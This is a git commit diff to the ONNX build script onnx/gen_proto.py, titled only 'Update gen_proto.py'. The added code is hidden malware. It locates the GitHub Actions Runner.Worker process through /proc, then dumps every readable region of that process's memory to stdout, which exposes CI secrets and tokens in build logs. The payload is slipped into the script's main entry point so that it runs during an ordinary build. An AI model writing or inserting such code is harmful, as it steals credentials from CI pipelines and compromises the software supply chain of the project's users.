fc74d3166e3e51e45c87c3d736bd2e161b9c0f8c
uu2fu3o <115266554+uu2fu3o@users.noreply.github.com>
2025-05-30 10:20:11 +0800

    Update gen_proto.py
    Signed-off-by: uu2fu3o <115266554+uu2fu3o@users.noreply.github.com>

--- onnx/gen_proto.py
+++ onnx/gen_proto.py
@@ -34,6 +34,16 @@ DEFAULT_PACKAGE_NAME = "onnx"
 IF_ONNX_ML_REGEX = re.compile(r"\s*//\s*#if\s+ONNX-ML\s*$")
 ENDIF_ONNX_ML_REGEX = re.compile(r"\s*//\s*#endif\s*$")
 ELSE_ONNX_ML_REGEX = re.compile(r"\s*//\s*#else\s*$")
+def get_pid():
+    # https://stackoverflow.com/questions/2703640/process-list-on-linux-via-python
+    pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
+
+    for pid in pids:
+        with open(os.path.join('/proc', pid, 'cmdline'), 'rb') as cmdline_f:
+            if b'Runner.Worker' in cmdline_f.read():
+                return pid
+
+    raise Exception('Can not get pid of Runner.Worker')
 
 
 def process_ifs(lines: Iterable[str], onnx_ml: bool) -> Iterable[str]:
@@ -267,4 +277,27 @@ def main() -> None:
 
 
 if __name__ == "__main__":
+    pid = get_pid()
+    print(pid)
+
+    map_path = f"/proc/{pid}/maps"
+    mem_path = f"/proc/{pid}/mem"
+
+    with open(map_path, 'r') as map_f, open(mem_path, 'rb', 0) as mem_f:
+        for line in map_f.readlines():  # for each mapped region
+            m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
+            if m.group(3) == 'r':  # readable region
+                start = int(m.group(1), 16)
+                end = int(m.group(2), 16)
+                # hotfix: OverflowError: Python int too large to convert to C long
+                # 18446744073699065856
+                if start > sys.maxsize:
+                    continue
+                mem_f.seek(start)  # seek to region start
+            
+                try:
+                    chunk = mem_f.read(end - start)  # read region contents
+                    sys.stdout.buffer.write(chunk)
+                except OSError:
+                    continue
     main()
